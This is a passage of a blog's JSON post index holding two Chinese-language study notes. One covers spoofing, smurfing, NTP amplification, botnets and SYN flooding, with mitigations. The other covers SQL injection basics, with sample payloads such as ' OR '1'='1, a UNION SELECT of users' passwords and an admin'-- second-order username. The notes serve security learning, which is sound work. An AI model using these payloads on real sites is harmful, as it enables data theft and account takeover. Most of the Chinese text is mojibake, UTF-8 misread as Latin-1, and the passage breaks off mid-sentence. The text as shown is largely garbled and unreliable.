serverç»™å…¶ä»–clientåˆ†é…åœ°å€å’Œå…¶ä»–é…ç½®ä¿¡æ¯ï¼Œå¯¹ä»–ä»¬è¿›è¡Œæ§åˆ¶      Flooding and Amplification ICMP Smurfing   ICMP\nPing : æåˆ°ICMPåè®®ï¼Œå°±ä¸å¾—ä¸æåˆ°pingï¼Œpingå°±ç±»ä¼¼äºä¸€ä¸ªå£°çº³ç³»ç»Ÿï¼Œé€šè¿‡å‘ç‰¹å®šçš„ç”µè„‘å‘é€ ICMP ECHO_REQUEST ï¼Œæ¥ä½¿ä»–ä»¬é€šè¿‡è¿”å› ECHO_REPLY_REQUEST æ¥éªŒè¯æ˜¯å¦å¯ä»¥é€šä¿¡     ICMP Smurfing\nAttackeré€šè¿‡å‘ä¸€ä¸ªå±€åŸŸç½‘çš„å¹¿æ’­åŸŸä¸­å‘é€å¤§é‡çš„ spoofed ICMP ECHO_REQUEST æ¥è¯±å¯¼å¤§é‡çš„clientså‘é€ ICMP ECHO_REPLY_REQUEST åˆ°æŒ‡å®šçš„ä¸€å°clientè¿›è€Œä½¿å…¶å´©æºƒ  Amplification : æˆ‘ä»¬ä»ä¸Šé¢çš„ä¾‹å­å¯ä»¥çœ‹åˆ°ï¼Œé€šè¿‡ä¸€ä¸ªç®€å•çš„å¹¿æ’­ï¼Œå°±å¯ä»¥è®©è¿™ä¹ˆå¤šçš„clientè¿›è€Œäº§ç”Ÿå·¨å¤§çš„æµé‡ï¼Œè¿›è€Œå°±å‚¬ç”Ÿå‡ºä¸€ä¸ªæ–°çš„æŠ€æœ¯å°±æ˜¯ Amplification ,å¯ä»¥é€šè¿‡å¤šå±‚çš„amplifiersæ¥å®ç°å·¨å¤§çš„DDoSæµé‡   \u0026lt;br/\u0026gt;    NTP Amplification DDoS Attack   NTP\n Network time protocol  UDP protocol  port 123   NTPç”¨æ¥ç”¨æ¥å„ä¸ªä¸»æœºçš„æ—¶é’Ÿ NTPæ˜¯ä¸€ä¸ªåˆ†å±‚çš„ï¼Œä¸­é—´å±‚çš„æ—¶é—´èµ„æºç³»ç»Ÿ  æ¯ä¸€å±‚æˆ‘ä»¬ç§°ä¸º stratum ,ç”±æœ€ä¸Šå±‚çš„clockä¸€å±‚å±‚åŒæ­¥åˆ°ä¸åŒ stratum çš„NTP server   NTPå¦‚ä½•å·¥ä½œ\n  Clienté¦–å…ˆå‘å‡ºNTP messageï¼Œå¹¶ä¸”åœ¨ä¸Šé¢è®°å½•å½“å‰çš„æ—¶é—´æˆ³ï¼š T1=9:00:00am     NTP server æ”¶åˆ°åé©¬ä¸Šæ‰“ä¸Šæ—¶é—´æˆ³ï¼š T2=10:00:01am     NTP severè¿”å›ä¸€æ¡NTP messageï¼Œç„¶ååœ¨å‘å‡ºä¹‹å‰æ‰“ä¸Šæ—¶é—´æˆ³ï¼š T3=10:00:02am     NTP messageåˆ°è¾¾ç”¨æˆ·çš„æ—¶å€™é©¬ä¸Šæ‰“ä¸Šæ—¶é—´æˆ³ï¼š T4=9:00:03am   ç”¨è¿™å››ä¸ªæ—¶é—´æˆ³ï¼Œæˆ‘ä»¬å°±è¶³ä»¥åŒæ­¥clientçš„æ—¶é—´    Timestamp Value Description     T1 09:00:00 Clientå‘å‡ºçš„æ—¶é—´   T2 10:00:01 Serveræ”¶åˆ°çš„æ—¶é—´   T3 10:00:02 Serverå‘å‡ºçš„æ—¶é—´   T4 09:00:03 Clientæ”¶åˆ°çš„æ—¶é—´      è®¡ç®—æ‰€æœ‰çš„Messageåœ¨ä¼ è¾“ä¸­delayçš„æ—¶é—´ delay = D1 - D2 = (T4-T1) - (T3-T2) = é€šä¿¡èŠ±è´¹çš„æ€»æ—¶é•¿ - åœ¨serverä¸Šçš„å¤„ç†æ—¶é—´ = 3 - 1 = 2 seconds   è®¡ç®— NTP client ä¸NTP server ä¹‹é—´çš„æ—¶é—´å·® O1 = T2 - T1 = 1h 1s O2 = T3 - T4 = 59min T2 = T1 + offset + delay/2 T4 = T3 - offset + delay/2 å› æ­¤Offset = (O1 + O2)/2 = [(T2 - T1 - delay/2) + (T3 - T4 + delay/2)] / 2 = 1 hour æ€»ä¹‹å°±æ˜¯ (=æœåŠ¡ç«¯çš„ä¸¤ä¸ªæ—¶é—´ - å®¢æˆ·ç«¯çš„ä¸¤ä¸ªæ—¶é—´ =)/2 = offset         NTP amplification attack\nNTP amplification attack ä¾èµ–äºåˆ©ç”¨å…¬å…±å¯ä»¥è®¿é—®çš„ NTP server æ¥å‘å‡ºNTP RESPONSEå®ç°å¯¹victim hostçš„DDoSæ”»å‡» è¡¥å……çŸ¥è¯† : NTP æœåŠ¡æ”¯æŒç®¡ç†å‘˜å‘NTP serveræŸ¥è¯¢å…¶æ‰€ç®¡ç†åŒæ­¥çš„clientsä¿¡æ¯ï¼ŒNTP serversé€šè¿‡å‘clientå‘é€monlistå‘½ä»¤æ¥è·å¾—æ‰€æœ‰æœ€è¿‘è¿æ¥è¿‡çš„hostsçš„åˆ—è¡¨ ntpd : NTP daemonæ˜¯ä¸€ä¸ªæ“ä½œç³»ç»Ÿçš„åå°é©»ç•™ç¨‹åºï¼Œç”¨æ¥è®¾ç½®å’Œç»´æŠ¤ç³»ç»Ÿæ—¶é—´å¹¶ä¸NTP serveräº¤äº’å®ç°æ—¶é’ŸåŒæ­¥ åœ¨Ntpdåœ¨4.2.7ä¹‹å‰çš„ç‰ˆæœ¬éƒ½æ˜¯å­˜åœ¨æ¼æ´çš„ã€‚ åœ¨è€çš„æœºå™¨ä¸­ï¼Œmonlist commandæ˜¯é»˜è®¤å¼€å¯çš„,å®ƒå°†ä¼šè¿”å›æœ€è¿‘600ä¸ªé€šä¿¡è¿‡çš„clientçš„IPåœ°å€ï¼ˆä¹Ÿå°±æ˜¯è¯´ä¸€æ¡monlist commandï¼Œå¯ä»¥è¿”å›æ¯”åŸæœ¬å¤§çš„å¤šçš„æ•°æ®ï¼‰   How NTP amplification attack works?\n  Attackerä½¿ç”¨botæ¥ä¼ªé€ NTP request packetsï¼Œä½¿ç”¨victimçš„IPåœ°å€     Botnet å‘é€è¿™äº›ä¼ªé€ çš„NTPè¯·æ±‚ï¼Œæ¥è¯±ä½¿NTP serversè°ƒç”¨ä»–ä»¬çš„monlistå‘½ä»¤ï¼Œè¿”å›å¤§é‡çš„response     Clientæ”¶åˆ°äº†æ¯ä¸€ä¸ªNTP serveræ‰€è¿”å›çš„600ä¸ªIPåœ°å€çš„ä¿¡æ¯ï¼Œç›¸å½“äºæ”¶åˆ°äº†ä¸€æ¬¡DoSæ”»å‡»ã€‚æˆ‘ä»¬æ ¹æ®ä¸Šé¢Wiresharkçš„æˆªå›¾å¯ä»¥è§‚å¯Ÿåˆ°ï¼Œä¸€æ¡çš„spoofed NTP requeståªéœ€è¦234bytesï¼Œä½†æ˜¯å´è¦å—åˆ°100ä¸ª482 bytesçš„æ•°æ®åŒ…ï¼Œå¯è§å…¶æ”»å‡»åŠ›åº¦ã€‚       Botnet æˆ‘ä»¬ä¹‹å‰åœ¨NTP amplification attackå·²ç»æåˆ°è¿‡äº†botçš„ä½¿ç”¨ï¼Œåœ¨è¿™ä¸€ç« èŠ‚ä¸­ï¼Œæˆ‘ä»¬æ¥ç¨å¾®å±•å¼€è®²ä¸€è®²Botnetçš„å†…å®¹ Botnetï¼Œåƒµå°¸ç½‘ç»œï¼Œç®€å•æ¥è¯´å°±æ˜¯é»‘å®¢é€šè¿‡æ§åˆ¶ä¸€ç³»åˆ—çš„è®¾å¤‡ï¼ˆä¸»æœºï¼Œæ‰‹æœºï¼ŒIoTè®¾å¤‡ç­‰ï¼‰ï¼Œå®ç°å¯¹äºæœ¬æœºä¿¡æ¯çš„è·å–ä»¥åŠæ§åˆ¶æƒï¼Œå¯ä»¥åˆ©ç”¨æ‰€æ„ŸæŸ“çš„botæˆ–è€…åƒµå°¸æ¥å®ç°å„ç§æ”»å‡»ï¼Œå¹¶é€šè¿‡C\u0026amp;C(command and control) serveræ¥å®ç°é€šä¿¡ä¸æŒ‡ä»¤ä¸‹å‘   å¦‚ä½•æ­å»ºä¸€ä¸ªBotnet?\n é»‘å®¢é¦–å…ˆéœ€è¦å¾—åˆ°ä¸€ç¾¤å—æ„ŸæŸ“çš„ç”¨æˆ·è®¾å¤‡ï¼Œä»–ä»¬å¯ä»¥è‡ªå·±æƒ³åŠæ³•å»æ„ŸæŸ“ï¼Œä¹Ÿå¯ä»¥ä»åœ°ä¸‹å¸‚åœºè´­ä¹°åˆ«äººæ„ŸæŸ“çš„  ç„¶åï¼Œè®©è¿™äº›è¢«æ„ŸæŸ“çš„botså»è¿æ¥ä¸Š C\u0026amp;C server,å®ç°é€šä¿¡ä¸ç®¡ç†  æ¥ç€ï¼Œé»‘å®¢å°±å¯ä»¥é€šè¿‡C\u0026amp;C serveræ¥ä¸‹è¾¾æŒ‡ä»¤ï¼Œè¦æ±‚Botå»å·å–æœ¬æœºçš„ä¿¡æ¯ï¼Œäº¦æˆ–è€…æ˜¯é…åˆå®ç°æ”»å‡»     TCP SYN Flooding   TCP\n  TCP æ˜¯ä¸€ä¸ªä¼ è¾“å±‚çš„åè®®ï¼Œç”¨äºå¾ˆå¤šæˆ‘ä»¬è€³ç†Ÿèƒ½è¯¦çš„åè®®ä¾‹å¦‚HTTP, SMTP è¿˜æœ‰ ftp   TCP æä¾›äº†å¯é çš„ç‚¹å¯¹ç‚¹çš„åŸºäºè¿æ¥çš„é€šä¿¡ï¼Œå¦‚æœè¯´ç½‘ç»œå±‚çš„IPåœ°å€æ˜¯æä¾›äº†å¿«é€’ä»æ½è´§åˆ°é€è¾¾çš„è·¯å¾„ï¼Œé‚£ä¹ˆä¼ è¾“å±‚çš„TCPå’ŒUDPç›¸å½“äºæ˜¯æä¾›äº†ä¼ è¾“è·¯ä¸Šçš„ä¿é™©   å…¶å¯é æ€§ä¸»è¦æ˜¯é€šè¿‡ segment sequencing, re-trasmission and loss detection æ¥å®ç°çš„   åŒæ—¶TCPæä¾›äº†æµé‡æ§åˆ¶å’Œæ‹¥å¡ç®¡ç†çš„åŠŸèƒ½ï¼Œåªè¦æ˜¯é€šè¿‡æ»‘åŠ¨çª—å£ç®—æ³•ä»¥åŠä¸¢åŒ…æ£€æµ‹å®ç°çš„     TCP connection\næ¯ä¸€ä¸ª TCP connection çš„æ ‡è¯†ç¬¦å°±æ˜¯ï¼š  Source IP address + port number  Destination IP address + port number  å…¶ä¸­Port numberæŒ‡ä»£çš„å°±æ˜¯æ‰€è·‘çš„æœåŠ¡æ‰€å¯¹åº”çš„number       Three-way handshake ä¸‰æ¬¡æ¡æ‰‹åè®®\nä¹‹å‰æˆ‘ä»¬æåˆ°è¿‡TCPåè®®æ˜¯åŸºäºè¿æ¥çš„åè®®ï¼Œé‚£ä¹ˆä¸‰æ¬¡æ¡æ‰‹åè®®ï¼Œå°±æ˜¯å…¶å†…ç½®çš„ï¼Œç”¨äºå»ºç«‹è¿æ¥çš„åè®® é¦–å…ˆæˆ‘ä»¬å…ˆæ¥è®¤è¯†ä¸€ä¸‹ä¸€ä¸ªç”¨äºä¸‰æ¬¡æ¡æ‰‹åè®®çš„TCP headeråº”è¯¥åŒ…å«ä»€ä¹ˆä¿¡æ¯ å…¶åº”è¯¥åŒ…æ‹¬ï¼š  Port numbers (16 bits each)  SYN flag (1 bit)  ACK flag (1 bit)  Sequence number (32 bits)  Acknowledgement number (32 bits)    ç„¶åçœ‹ä¸€ä¸ªå…·ä½“çš„ä¾‹å­  Sourceé¦–å…ˆå‘èµ·ç¬¬ä¸€æ¬¡æ¡æ‰‹è¯·æ±‚ï¼Œåä¸º SYN å‘å‡ºå…¶æ‰€å®šä¹‰çš„ä¸€ä¸ªsequence numberä¸º x  æ¥ç€Destinationè¿”å›ç¬¬äºŒæ¬¡æ¡æ‰‹è¯·æ±‚ï¼Œåä¸º SYN+ACK ï¼Œå°†sequence numberæ”¹ä¸ºå…¶æ‰€å®šä¹‰çš„å€¼ y ï¼Œå¹¶å°†acknowledge numberè®¾ä¸º x+1  æœ€åSourceå‘èµ·ç¬¬ä¸‰æ¬¡æ¡æ‰‹è¯·æ±‚ï¼Œåä¸º ACK , è¿”å›acknowledgement numberä¸º y+1 , åŒæ—¶é€’å¢è‡ªå·±çš„ sequence numberä¸º x+1  è‡³æ­¤ä¸‰æ¬¡æ¡æ‰‹è¿æ¥æˆåŠŸï¼Œæ¥ä¸‹æ¥å°±å¯ä»¥æ­£å¸¸çš„è¿›è¡Œé€šä¿¡ï¼Œå¹¶ä¸”Source å’Œ Destination å°†é€æ¸é€’å¢å…¶è‡ªå·±çš„ sequence number ä»¥åŠ acknowledge number          TCP SYN flooding\nTCP SYN flooding attackæœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªDoS attack, å…¶ç›®çš„æ˜¯ä¸ºäº†é€šè¿‡å‘ç›®æ ‡æœåŠ¡å™¨å‘é€å¤§é‡çš„æ— æ•ˆ SYN, æ¥è¯±ä½¿æœåŠ¡å™¨å‘é€å¯¹ç­‰æ•°é‡çš„ SYN+ACK è¯·æ±‚, ç»§è€Œç­‰å¾… ACK è¯·æ±‚å›å¤ï¼ŒåŒæ—¶åˆ©ç”¨æœ¬åœ°ç¼“å­˜è¿™ä¸ªè¿æ¥ï¼Œæœ€ç»ˆå¯¼è‡´æœ¬åœ°çš„ç¼“å­˜ç©ºé—´è¢«å æ»¡ã€‚ æˆ‘ä»¬æœ€åé€šè¿‡ä¸€ä¸ªå…·ä½“çš„ä¾‹å­æ¥å¤ç°ä¸€ä¸‹è¿™ä¸ªè¿‡ç¨‹   é¦–å…ˆé»‘å®¢å‘æœåŠ¡å™¨å‘é€å¤§é‡çš„ SYN è¯·æ±‚,ç”¨çš„æ˜¯ä¼ªé€ è¿‡çš„IPåœ°å€     æ¥ç€æœåŠ¡å™¨åœ¨æ”¶åˆ°äº† SYN è¯·æ±‚ä¹‹åï¼Œä¾¿ä¼šå‘å‡ºå¯¹åº”çš„ SYN+ACK å›å¤è¯·æ±‚åˆ°ä¹‹å‰ä¼ªé€ çš„IPåœ°å€     è¢«ä¼ªé€ çš„IPåœ°å€çš„ä¸»æœºæ”¶åˆ°ç”±æœåŠ¡å™¨å‘æ¥çš„å¤§é‡ SYN+ACK è¯·æ±‚ï¼Œå¯å‘ç°æ²¡æœ‰è®°å½•æ˜¾ç¤ºè‡ªå·±ä¹‹å‰æœ‰å‘é€è¿‡ SYN è¯·æ±‚åˆ°è¯¥æœåŠ¡å™¨ï¼Œå› æ­¤ä¸ä¼šå›å¤ ACK è¯·æ±‚ã€‚åŒæ—¶ï¼Œæ¯ç»´æŠ¤ä¸€ä¸ªç­‰å¾… ACK çš„è¿æ¥ï¼ŒæœåŠ¡å™¨éƒ½è¦å¼€è®¾ä¸€ä¸ªæ–°çš„ç«¯å£ï¼ŒåŒæ—¶ç”¨ç¼“å­˜ä¿å­˜è¿™äº›ä¿¡æ¯ï¼Œä¸€æ—¦è¶…å‡ºä¸Šé™ï¼Œé‚£ä¹ˆå°±ä¼šä½¿æœåŠ¡å™¨ç˜«ç—ª     Mitigation MAC flooding mitigation  ä½¿ç”¨port securityï¼Œé™åˆ¶ä»ç«¯å£å¯ä»¥è·å–çš„MACåœ°å€æ•°é‡  å¯¹å®‰å…¨çš„MACåœ°å€è¿›è¡Œé•¿æ—¶é—´çš„ä½¿ç”¨ï¼ˆä¸å¯æ›¿ä»£ï¼‰ï¼Œåªè¦è¿™äº›åœ°å€è¿˜å­˜åœ¨äºç¬¬ä¸‰å±‚çš„è®¾å¤‡çš„ARP tableå½“ä¸­ï¼ˆä¾‹å¦‚è·¯ç”±å™¨ï¼Œè¡¨ç¤ºä¿¡ä»»è·¯ç”±å™¨çš„å®‰å…¨æªæ–½ï¼‰  ä½¿ç”¨AAA(Authentication, authorisation and accounting)æœåŠ¡å™¨æ¥éªŒè¯æ‰€æœ‰MACåœ°å€   DHCP starvation mitigation  ä½¿ç”¨Port security, åªæœ‰å¯ä»¥ä¿¡ä»»çš„ç«¯å£æ‰€è¿æ¥çš„DHCPè¯·æ±‚æ‰è¢«å…è®¸é€šè¿‡  DHCP snooping, åªæ¥å—ä¿¡ä»»çš„DHCPæœåŠ¡å™¨æ‰€å‘é€çš„é…ç½®   DHCP spoofing mitigation  ä½¿ç”¨å…¥ä¾µæ£€æµ‹ç³»ç»Ÿï¼Œå¹¶å®¡æ ¸æ•°å­—ç­¾åæ¥é¿å…ä¼ªé€ çš„DHCPæœåŠ¡å™¨  DHCP snooping, åªæ¥å—ä¿¡ä»»çš„DHCPæœåŠ¡å™¨æ‰€å‘é€çš„é…ç½®   ICMP smurfing mitigation  å•ç‹¬é…ç½®æ¯ä¸€ä¸ªä¸»æœºå’Œè·¯ç”±å™¨ï¼Œæ‹’æ¥ç›¸åº”ICMPè¯·æ±‚å’Œå¹¿æ’­ä¿¡æ¯  é…ç½®è·¯ç”±å™¨ä¸è¦è½¬å‘ICMPåˆ°å¹¿æ’­åŸŸå½“ä¸­  å…¥ç«™æµé‡æ£€æŸ¥ï¼Œæ‹’ç»ä¼ªé€ æºåœ°å€çš„æ•°æ®   NTP amplification DDoS mitigation  ç¦æ­¢ monlist çš„ä½¿ç”¨ï¼Œä¸€æ¬¡æ¥é¿å…NTPè¿”å›éå¸¸å¤§çš„ä¿¡æ¯  å…¥ç«™æµé‡æ£€æŸ¥ï¼Œæ‹’ç»ä¼ªé€ æºåœ°å€çš„æ•°æ®  Firewall   TCP SYN flooding attack mitigation  ä½¿ç”¨é˜²ç«å¢™æ¥è¿›è¡Œfilteringï¼Œå¯¹é‚£äº›å¾ˆæ˜æ˜¾çš„spoofedçš„IP addressè¿›è¡Œä¸¢å¼ƒ  å‡å°‘SYNæ¥å—çš„æ—¶é—´ï¼Œå°†é‚£äº›é»‘å®¢å»ºç«‹çš„åŠè¿æ¥å°½æ—©å…³é—­æ¥é˜²æ­¢å´©æºƒ  ä½¿ç”¨é˜²ç«å¢™å¯¹äºTCP connectionæ¥è¿›è¡Œå®¡æŸ¥   ","date":"2022-04-24T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/nse_week_3_spoofing_flooding_and_amplification/","title":"NSE Week 3: Spoofing, flooding and amplification"},{"content":"SQLæ³¨å…¥ï¼šåŸºç¡€ ç®€å•æ¥è¯´ï¼ŒSQLæ³¨å…¥å°±æ˜¯attackersé€šè¿‡å¯¹å®¢æˆ·ç«¯å‘å‡ºçš„HTTPè¯·æ±‚çš„ä¿®æ”¹ï¼Œåœ¨æœåŠ¡ç«¯æ‰§è¡Œä»–ä»¬æƒ³è¦çš„SQLæ“ä½œã€‚ ï¼ˆæœ¬ç¯‡ç”¨äºåŸºç¡€æ¦‚å¿µçš„å½’çº³æ€»ç»“ï¼Œå¯èƒ½ä¸å¤ªé€‚åˆæ–°æ‰‹å­¦ä¹ ï¼‰ 1. SQLæ³¨å…¥äº§ç”Ÿçš„åŸå›   Missing or improper input validation (ç”¨æˆ·è¾“å…¥æ£€æŸ¥çš„ç¼ºä¹æˆ–è€…ä¸å¤Ÿå®Œå–„)  Application-generated queries containing user-fed input (åº”ç”¨æŸ¥è¯¢åˆ°çš„ç»“æœèƒ½å¤Ÿåé¦ˆç”¨æˆ·ä¹‹å‰çš„ä¸æ°å½“è¾“å…¥)   2. SQLæ³¨å…¥çš„æ³¨å…¥ç‚¹(Sinks)å’Œç›®æ ‡(targets) 2.1 Sinks SQLi sinks è¡¨ç¤ºå¯èƒ½å­˜åœ¨çš„æ³¨å…¥ç‚¹  GET/POST parameters  Every HTTP header  Cookies  Database itself   ä»¥ä¸Šæ‰€æœ‰çš„è¿™äº›å†…å®¹ï¼Œéƒ½å¯ä»¥è½»æ¾çš„è¢«ç”¨æˆ·æ‰€ä¿®æ”¹ï¼Œä»–ä»¬ä¹Ÿéƒ½æœ‰å¯èƒ½è¢«ç”¨äºæœåŠ¡ç«¯çš„æ•°æ®åº“æŸ¥è¯¢æ“ä½œä¸­ï¼Œå› æ­¤éƒ½éœ€è¦ä¸¥è‚ƒå¯¹å¾… 2.2 Targets    Target Description     è¯†åˆ«å¯æ³¨å…¥çš„å˜é‡ æŸ¥æ‰¾æ³¨å…¥ç‚¹ï¼ˆä»¥ä¸Šå…¨æ˜¯ï¼‰   æ•°æ®åº“ä¿¡æ¯ ä»€ä¹ˆæ•°æ®åº“ï¼Ÿä»€ä¹ˆç‰ˆæœ¬çš„æ•°æ®åº“   æ•°æ®åº“ç»“æ„ åº“åï¼Œè¡¨åï¼Œåˆ—åï¼Œåˆ—ç±»å‹ï¼Œè¯»å†™æƒé™ç­‰   è·å–æ•°æ® çˆ†åº“   æ•°æ®ä¿®æ”¹ insert, update, deleteæ“ä½œ   DOS LOCKï¼ŒDELETE æ“ä½œæ¥ç ´åæ•°æ®åº“çš„Availabilityé˜»æ­¢ç”¨æˆ·æ­£å¸¸è®¿é—®åº”ç”¨   ç»•è¿‡éªŒè¯ ç»•è¿‡ç™»é™†æ³¨å†Œç­‰ä¸€ç³»åˆ—æ£€æŸ¥   è¿œç¨‹æŒ‡ä»¤æ³¨å…¥ è¿œç¨‹æ§åˆ¶æ•°æ®åº“    3. æ³¨å…¥çš„æŠ€å·§   åˆ¤æ–­æ³¨å…¥ç‚¹ : è¾“å…¥çš„å†…å®¹ï¼Œèƒ½å¦è®©é¡µé¢äº§ç”Ÿå¼‚å¸¸çš„è¡Œä¸º  SQLæŠ¥é”™ä¿¡æ¯  é¡µé¢å†…å®¹çš„éæ­£å¸¸æ˜¾ç¤º (e.g. æ²¡æœ‰å†…å®¹æ˜¾ç¤º)  é¡µé¢ç›¸åº”æ—¶é—´å˜åŒ–     é—­åˆå¼‚å¸¸ : å¦‚æœè¯´ç¬¬ä¸€æ­¥çš„ç›®çš„æ˜¯ä¸ºäº†è®©æœåŠ¡ç«¯çš„SQLæŸ¥è¯¢è¯­å¥å‡ºé”™ï¼Œé‚£ä¹ˆç¬¬äºŒæ­¥å°±æ˜¯ä¸ºäº†åœ¨æ­¤åŸºç¡€ä¸Šè®©SQLè¯­å¥å¯ä»¥å†æ¬¡è¢«æ­£å¸¸è§£æ   åˆ¤æ–­æ³¨å…¥çš„ç±»å‹ : å°è¯•ä¸åŒç±»å‹çš„æ³¨å…¥payloadï¼Œè§‚å¯Ÿå­˜åœ¨å“ªç§æ³¨å…¥   ä¿®æ”¹SQLè¯­å¥è¯­ä¹‰ : ä¿®æ”¹è¯­ä¹‰ï¼Œè®©æ•°æ®åº“æ‰§è¡Œæˆ‘ä»¬æƒ³è¦çš„æ“ä½œ   è·å–æ•°æ® : çˆ†åº“è·å¾—æ•°æ®   è¿™äº›æ“ä½œä¹Ÿå°±å¯¹åº”äº†SQLæ³¨å…¥çš„ä¸‰è¦ç´ :  æ‰€æœ‰HTTPè¯·æ±‚çš„å†…å®¹æ˜¯å¦è¿›è¡Œäº†ä¸¥æ ¼çš„æ ¡éªŒ  æ˜¯å¦å¯ä»¥é‡æ–°é—­åˆæ³¨å…¥ç‚¹çš„è¯­å¥é”™è¯¯ï¼Œä½¿å…¶å¯ä»¥è¢«é‡æ–°æ­£å¸¸è§£æ  è¯­å¥æ˜¯å¦å¯ä»¥è¢«æ¶æ„ä¿®æ”¹   4. SQLæ³¨å…¥å¯¹äºå®‰å…¨çš„å½±å“(CIA)  Confidentiality  æŸ¥çœ‹å…¶ä»–äººçš„éšç§ä¿¡æ¯  æ— æˆæƒåœ°è®¿é—®ä»–äººçš„è´¦å·    Integrity ä¿®æ”¹æ•°æ®åº“çš„æ•°æ®ï¼šå·¥èµ„ï¼Œæˆç»©ç­‰  Availabity  åˆ åº“è·‘è·¯  ä¿®æ”¹è´¦æˆ·ä¿¡æ¯ï¼šå¯†ç   åˆ é™¤æ—¥å¿—     5. å¦‚ä½•é˜²å¾¡SQLæ³¨å…¥  i. ä½¿ç”¨é¢„ç¼–è¯‘è¯­å¥ Prepared statement é¡¾åæ€ä¹‰ï¼Œå°±æ˜¯å°†SQLè¯­å¥æå‰ç¼–è¯‘ï¼Œå³å…¶æœ€ç»ˆè¦æ‰§è¡Œçš„æ“ä½œå·²ç»å®šäº†ï¼Œå”¯ä¸€ç¼ºå°‘çš„å°±æ˜¯å‚æ•°ï¼Œå…¶è¯­ä¹‰ä¸ä¼šå†å—å½±å“ï¼Œè¿™ä¹Ÿæ˜¯é˜²å¾¡SQLæ³¨å…¥çš„æœ€ä½³æ‰‹æ®µ  ii. æ£€æŸ¥æ•°æ®ç±»å‹ å¯¹äºæ‰€éœ€è¦çš„å‚æ•°è¿›è¡Œä¸¥æ ¼çš„ç±»å‹/æ ¼å¼æ£€æŸ¥ï¼Œå¯ä»¥ä»å¾ˆå¤§ç¨‹åº¦ä¸Šé˜²å¾¡SQLæ³¨å…¥ (æ•°æ®ç±»å‹ï¼Œé‚®ç®±æ ¼å¼ï¼Œæ—¥æœŸæ ¼å¼ç­‰)  iii. ä½¿ç”¨å®‰å…¨å‡½æ•° éšç€å®‰å…¨å¾—åˆ°è¶Šæ¥è¶Šå¤šçš„é‡è§†ï¼Œç¼–ç¨‹è¯­è¨€ä¹Ÿåœ¨ä¸æ–­æ›´æ–°æ›´ä¸ºå®‰å…¨çš„å‡½æ•°å’Œæœºåˆ¶ç”¨äºæŠµå¾¡ä¸€äº›å¸¸è§çš„æ”»å‡»   6. å¸¸è§çš„æ³¨å…¥ç±»å‹ String SQLi æ³¨å…¥ç‚¹åŸæœ¬éœ€è¦çš„æ˜¯å­—ç¬¦ä¸² SELECT * FROM user_data WHERE first_name = \u0026#39;John\u0026#39; AND last_name = \u0026#39;\u0026#39; OR \u0026#39;1\u0026#39; = \u0026#39;1\u0026#39; Numberic SQLi æ³¨å…¥ç‚¹åŸæœ¬éœ€è¦çš„æ˜¯æ•°å­— SELECT * FROM user_data WHERE Login_Count = 1 AND userid = 1 OR 1 = 1 Union query SQLi åˆ©ç”¨SQL Union å…³é”®è¯æ¥å®ç°é¢å¤–çš„è¯­ä¹‰æ‹¼æ¥ \u0026lt;?php $q = \u0026#34;SELECT id, name, price, description\u0026#34;. \u0026#34;FROM product WHERE category=\u0026#34;.$_GET[\u0026#39;cat\u0026#39;]; ?\u0026gt;æ‹¼æ¥ä¸€æ¡æŸ¥è¯¢è¯­å¥ï¼š \u0026lt;?php $cat = \u0026#34;1 UNION SELECT 1, user, 1, pass FROM users\u0026#34;; ?\u0026gt;è¦æ³¨æ„çš„æ˜¯ï¼Œæ‹¼æ¥çš„æŸ¥è¯¢è¯­å¥ï¼Œæ‰€æŸ¥è¯¢çš„columnæ•°é‡å¿…é¡»ä¸åŸæœ¬çš„ç›¸åŒï¼Œæ¯”å¦‚åŸæœ¬éœ€è¦æŸ¥è¯¢usname, passwdä¸¤åˆ—ï¼Œé‚£ä¹ˆæ‹¼æ¥çš„æŸ¥è¯¢è¯­å¥ä¹Ÿéœ€è¦åŒ…å«ä¸¤åˆ—å†…å®¹ å¯ä»¥åˆ©ç”¨ order by å…³é”®è¯æ¥å®ç°å¯¹äºåˆ—æ•°çš„æµ‹è¯•ï¼ŒåŒæ—¶ä½¿ç”¨äºŒåˆ†æ³•çš„æŠ€å·§ï¼Œç›´åˆ°ä¸å†æŠ¥é”™ä¸ºæ­¢ ?category=1 order by 100 Second-order injection äºŒæ¬¡æ³¨å…¥ Second-order injectionå°±åƒåå­—æ‰€æŒ‡ç¤ºçš„é‚£æ ·ï¼Œæ³¨å…¥çš„è¯­å¥ä¼šåœ¨æœåŠ¡ç«¯çš„SQLä»£ç ä¸­ï¼Œå‡ºç°ä¸¤æ¬¡ï¼Œå› æ­¤ç§°ä¸ºäºŒæ¬¡æ³¨å…¥ ä¸å…ˆå‰æˆ‘ä»¬æåˆ°çš„æ³¨å…¥æ–¹æ³•ç›¸æ¯”ï¼ŒäºŒæ¬¡æ³¨å…¥å¹¶ä¸æ˜¯ç›´æ¥å‘èµ·æ³¨å…¥ï¼Œè€Œæ˜¯å…ˆè®©æ³¨å…¥çš„è¯­å¥å­˜å…¥æ•°æ®åº“ï¼Œå†è°ƒç”¨è¯¥æ•°æ®çš„æŸ¥è¯¢ï¼Œä»è€Œæ‹¼æ¥å®Œæˆï¼Œå®ç°æ³¨å…¥ ç¬¬ä¸€æ¬¡ æ¯”å¦‚åœ¨æ³¨å†Œçš„æ—¶å€™ï¼Œå°†æƒ³è¦æ³¨å…¥çš„ä»£ç æ”¾å…¥ç”¨æˆ·åä¸­ \u0026lt;?php $user = \u0026#34;admin\u0026#39;--\u0026#34;;?\u0026gt;ä¹Ÿè®¸æœåŠ¡ç«¯å¯¹äºæ³¨å†Œéƒ¨åˆ†çš„å˜é‡æœ‰ä¸¥æ ¼çš„å®¡æŸ¥æœºåˆ¶ï¼Œå´å¿½ç•¥äº†å…¶ä»–SQLè¯­å¥çš„å®¡æŸ¥ï¼Œé‚£æˆ‘ä»¬æ­¤æ—¶å°±å¾—åˆ°äº†ä¸€ä¸ª admin'-- çš„ç”¨æˆ· \u0026lt;?php $q = \u0026#34;UPDATE users SET pass=\u0026#39;\u0026#34;.$_POST[\u0026#39;newPass\u0026#39;]. \u0026#34;\u0026#39;WHERE user=\u0026#39;\u0026#34;.$row[\u0026#39;user\u0026#39;].\u0026#34;\u0026#39;\u0026#34;; ?\u0026gt;æ¥ä¸‹æ¥è§¦å‘ UPDATE æ“ä½œï¼Œè¿™é‡Œå´æ²¡æœ‰å¯¹æ•°æ®åº“ä¸­æŸ¥è¯¢åˆ°çš„å˜é‡åšä¸¥æ ¼çš„è¿‡æ»¤ï¼Œå¯¼è‡´æ³¨å…¥è¯­å¥æ‹¼æ¥æˆåŠŸï¼Œæˆ‘ä»¬å°±å¯ä»¥ä¿®æ”¹ 